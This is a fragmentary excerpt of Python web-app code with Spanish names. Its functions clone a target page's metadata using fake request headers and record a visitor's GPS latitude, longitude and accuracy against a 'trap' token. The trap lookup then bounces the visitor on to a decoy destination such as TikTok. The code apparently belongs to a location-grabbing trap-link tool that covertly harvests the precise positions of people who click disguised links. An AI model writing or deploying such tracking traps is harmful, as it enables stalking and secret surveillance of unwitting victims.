...
def clonar_metadatos(url):
    try:
        r = requests.get(url, headers=HEADERS_FALSOS, timeout=4)
...
def save_gps_bounce():
    t = request.args.get('token'); lat = request.args.get('lat'); lon = request.args.get('lon'); acc = request.args.get('acc')
    conn = get_db_connection(); cur = conn.cursor()
    cur.execute("SELECT id, url_destino FROM trampas WHERE token=%s", (t,))
    res = cur.fetchone(); url = "https://tiktok.com"
    if res:
        tid, url = res
